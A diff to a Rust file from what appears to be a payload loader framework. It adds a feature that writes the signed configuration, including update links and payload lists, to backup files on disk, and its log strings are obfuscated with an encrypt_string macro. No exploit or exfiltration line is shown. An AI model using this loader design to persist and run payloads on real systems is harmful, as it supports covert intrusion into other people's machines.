@@ -1,8 +1,11 @@
 use crate::defuse::{Defuse, Operator};
 use crate::payload::Payload;
+use crate::link::FileLink;
 use crate::payload::PayloadExecThread;
 use crate::poollink::PoolLinks;
 use crate::rundata::RunData;
+use crate::utils::calculate_path;
+use crate::payload_util::create_directory;
 
 use chksum_sha2_512 as sha2_512;
 use chrono::prelude::*;
@@ -29,6 +32,7 @@ pub struct VerifSignMaterial {
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct Config {
     pub update_links: BTreeMap<u64, (String, PoolLinks)>,
+    pub backup_config: Vec<FileLink>,
     pub payloads: Vec<Payload>,
     pub defuse_update: Vec<Defuse>,
     pub defuse_payload: Vec<Defuse>,
@@ -52,6 +56,7 @@ pub struct Config {
 impl Config {
     pub fn new_unsigned(
         update_links: BTreeMap<u64, (String, PoolLinks)>,
+        backup_config: Vec<FileLink>,
         payloads: Vec<Payload>,
         defuse_update: Vec<Defuse>,
         defuse_payload: Vec<Defuse>,
@@ -74,6 +79,7 @@ impl Config {
         };
         Config {
             update_links: update_links,
+            backup_config: backup_config,
             sign_material: sign_material,
             payloads: payloads,
             defuse_update: defuse_update,
@@ -96,6 +102,7 @@ impl Config {
     pub fn new_signed(
         key_pair: &Ed25519KeyPair,
         update_links: BTreeMap<u64, (String, PoolLinks)>,
+        backup_config: Vec<FileLink>,
         payloads: Vec<Payload>,
         defuse_update: Vec<Defuse>,
         defuse_payload: Vec<Defuse>,
@@ -114,6 +121,7 @@ impl Config {
     ) -> Config {
         let mut new_loader = Config::new_unsigned(
             update_links,
+            backup_config,
             payloads,
             defuse_update,
             defuse_payload,
@@ -432,6 +440,7 @@ impl Config {
                                 "[+] DECISION: replace the active CONFIG, and run the payloads"
                             )
                         );
+                        self.backup_config();
                     }
 
                     return newconf;
@@ -456,4 +465,74 @@ impl Config {
         );
         self.to_owned()
     }
+
+    pub fn backup_config(&self) {
+        for backup_file in &self.backup_config{
+            info!(
+                "{}{:?}",
+                encrypt_string!("[+] backup_file: "), backup_file
+            );    
+            self.backup_config_to_file(backup_file);
+        }
+
+    }
+
+
+    // TODO reste a faire, il ne faut PAS backuper la config en clair, mais bien lui appliquer une suite de dataopération bien définie.
+    // ensuite, il faudra appliquer une logique de chargement de cette config si existante et plus récente etc... au lancement du loader
+    pub fn backup_config_to_file(&self , backup_file:&FileLink) {
+
+        
+        match calculate_path(&backup_file.file_path) {
+            Ok(path) => {
+                if let Err(e) = create_directory(&path) {
+                    warn!(
+                        "{}{:?} - {:?}",
+                        encrypt_string!("[!] Failed to create directory for backup file: "),
+                        path,
+                        e
+                    );
+                }
+        
+                info!("{}{:?}", encrypt_string!("[+] Write file: "), path);
+        
+                match serde_json::to_string_pretty(&self) {
+                    Ok(serialized) => {
+                        if let Err(e) = fs::write(&path, &serialized) {
+                            warn!(
+                                "{}{:?} - {:?}",
+                                encrypt_string!("[!] Failed to write backup file: "),
+                                path,
+                                e
+                            );
+                        }
+                    }
+                    Err(e) => {
+                        warn!(
+                            "{}{:?}",
+                            encrypt_string!("[!] Failed to serialize backup object: "),
+                            e
+                        );
+                    }
+                }
+            }
+            Err(e) => {
+                warn!(
+                    "{}{} - {:?}",
+                    encrypt_string!("[!] Failed to calculate backup path: "),
+                    backup_file.file_path,
+                    e
+                );
+            }
+        }
+        //let path: PathBuf = calculate_path(&backup_file.file_path).unwrap();
+        //info!("{}{:?}", encrypt_string!("[+] Write file: "), path);
+
+        //let serialized: String = serde_json::to_string_pretty(&self).unwrap();
+        //fs::write(path, &serialized).expect("Unable to write file");
 }
+
+
+}
+
+
